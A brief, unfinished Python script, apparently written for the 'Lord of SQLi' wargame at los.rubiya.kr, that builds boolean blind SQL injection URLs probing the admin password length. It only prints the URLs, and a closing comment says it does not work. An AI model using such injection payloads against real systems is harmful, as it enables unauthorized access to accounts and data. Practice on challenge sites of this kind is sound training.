# Blind based boolean

import requests

url  = "https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php/?pw="

s  = requests.Session()

cookies = {"PHPSESSID":"fpj4v1b6tu714bh0f5cu5vtk1d"}

for i in range(21):
    print("Testing length {}".format(i))
    payload = "' or id='admin' and length(pw)={}".format(i);
    final_url = url + payload
    print(final_url)


# ffs lord of sqli doesn't work 
